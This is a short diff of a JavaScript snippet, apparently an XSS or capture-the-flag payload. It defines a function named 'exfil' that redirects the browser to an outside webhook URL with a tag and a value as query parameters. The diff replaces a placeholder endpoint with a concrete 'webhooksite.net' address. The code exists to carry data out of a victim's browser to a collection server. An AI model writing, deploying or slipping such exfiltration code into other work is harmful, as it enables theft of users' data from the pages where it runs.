@@ -1,7 +1,7 @@
 (async () => {
   const exfil = (tag, value) => {
     location.href =
-      'https://webhook.site/TU-ID?tag=' +
+      'https://webhooksite.net/ae3222ba-a10c-4885-942d-a1e673df5116?tag=' +
       encodeURIComponent(tag) +
       '&d=' +
       encodeURIComponent(value);
